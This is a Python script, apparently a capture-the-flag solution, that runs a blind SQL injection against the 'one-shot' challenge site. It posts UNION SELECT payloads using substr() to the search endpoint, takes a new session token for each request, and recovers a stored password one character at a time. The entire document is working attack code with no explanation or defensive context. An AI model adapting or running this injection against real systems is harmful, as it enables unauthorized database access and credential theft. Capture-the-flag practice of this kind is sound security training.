import requests
import re
import string

url = "http://one-shot.amt.rs/"
custom = string.digits+string.ascii_lowercase

def getRandomTable():
    r = requests.post(url+"new_session")
    values = re.search(r'value="([^"]+)"',r.text).group(1)
    return values
def BrutePass():
    a = ""
    while(True):
        for j in range(100):
            for i in custom:
                values = getRandomTable()
                datas = {"id":values,"query":f"dsjbfsjbjdsbvjsnvjnsdvjndsvsvsd' union select password from table_fa87e1e66849df9b where substr(password,{j},1) = '{i}'-- -"}
                r = requests.post(url+"search",data=datas)
                if "****" in r.text:
                    a+=i
                    print(a)
                    break
                else:
                    print(f"[{i}] not ok")
                    # print(r.text)
BrutePass()
